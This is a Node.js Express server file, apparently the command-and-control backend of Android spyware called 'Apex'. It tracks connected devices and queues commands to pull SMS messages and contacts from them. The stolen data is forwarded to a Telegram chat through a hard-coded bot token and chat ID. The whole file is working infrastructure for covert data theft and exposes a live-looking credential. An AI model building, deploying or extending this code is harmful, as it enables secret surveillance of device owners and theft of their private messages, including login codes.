const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const compression = require('compression');
const fs = require('fs');
const axios = require('axios'); // Ensure you run: npm install axios

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- TELEGRAM SETTINGS ---
// Use process.env for security on Render

//const BOT_TOKEN = '8934078128:AAFOvXShVBYJ3TJBT34eHg2QZ8ZGA_0F5_M'; // Replace with your BotFather token
//const CHAT_ID = '6889335186'; // Replace with your numeric Chat ID
//const PORT = 3000;

const BOT_TOKEN = process.env.BOT_TOKEN || '8934078128:AAFOvXShVBYJ3TJBT34eHg2QZ8ZGA_0F5_M';
const CHAT_ID = process.env.CHAT_ID || '6889335186';

app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

let activeDevices = {};
if (fs.existsSync('devices.json')) {
    try {
        activeDevices = JSON.parse(fs.readFileSync('devices.json', 'utf8'));
        for (let id in activeDevices) activeDevices[id].status = 'Disconnected';
    } catch (e) { console.error("Error loading devices.json"); }
}

let pendingCommands = {};

function saveDevices() {
    fs.writeFileSync('devices.json', JSON.stringify(activeDevices, null, 2));
}

// Telegram Forwarding Function
async function notifyTelegram(deviceName, dataType, payload) {
    try {
        const message = `*Apex Alert*\n*Device:* ${deviceName}\n*Data:* ${dataType}\n\n${payload.substring(0, 3000)}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error:", e.message); }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/api/connect', (req, res) => {
    const deviceName = req.query.deviceName || 'Unknown';
    activeDevices[deviceName] = { deviceName, status: 'Connected', lastSeen: Date.now() };
    saveDevices();
    io.emit('device_status', activeDevices[deviceName]);
    res.status(200).send("OK");
});

app.get('/api/get-command', (req, res) => {
    const deviceName = req.query.deviceName;
    if (!deviceName) return res.status(400).send("Missing");

    if (activeDevices[deviceName]) {
        activeDevices[deviceName].lastSeen = Date.now();
        if (activeDevices[deviceName].status !== 'Connected') {
            activeDevices[deviceName].status = 'Connected';
            saveDevices();
            io.emit('device_status', activeDevices[deviceName]);
        }
    }

    if (pendingCommands[deviceName]) {
        const cmd = pendingCommands[deviceName];
        delete pendingCommands[deviceName];
        return res.status(200).json({ command: cmd });
    }
    res.status(204).send();
});

app.post('/api/sync-data', async (req, res) => {
    const { deviceName, dataType, payload } = req.body;
    const eventName = (dataType === 'SMS') ? 'sms_data_received' : 'contacts_data_received';
    
    // 1. Update Dashboard
    io.emit(eventName, { deviceName, logs: payload });
    
    // 2. Forward to Telegram
    await notifyTelegram(deviceName, dataType, payload);
    
    res.status(200).send("OK");
});

io.on('connection', (socket) => {
    socket.emit('initial_state', activeDevices);
    socket.on('controller_command', (data) => {
        const mapping = { 'sync_sms': 'SYNC_SMS', 'sync_contacts': 'SYNC_CONTACTS' };
        pendingCommands[data.targetDevice] = mapping[data.command] || data.command;
    });
    socket.on('purge_device_record', (data) => {
        delete activeDevices[data.deviceName];
        saveDevices();
        io.emit('device_removed', data.deviceName);
    });
});

setInterval(() => {
    const now = Date.now();
    for (let id in activeDevices) {
        if (now - activeDevices[id].lastSeen > 120000 && activeDevices[id].status === 'Connected') {
            activeDevices[id].status = 'Disconnected';
            saveDevices();
            io.emit('device_status', activeDevices[id]);
        }
    }
}, 30000);

// Use process.env.PORT for Render
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Apex Server running on port ${PORT}`));
